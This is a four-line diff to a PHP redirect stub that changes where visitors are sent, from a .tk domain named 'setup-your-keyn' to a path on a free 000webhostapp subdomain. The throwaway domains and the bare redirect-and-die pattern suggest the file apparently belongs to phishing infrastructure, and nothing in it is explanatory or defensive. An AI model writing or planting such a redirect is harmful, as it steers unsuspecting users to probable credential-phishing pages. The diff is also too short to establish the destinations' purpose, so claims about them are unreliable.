@@ -1,4 +1,4 @@
 <?php
-header("Location: https://setup-your-keyn.tk/");
+header("Location: https://contortional-transm.000webhostapp.com/actnor/");
 die();
 ?>
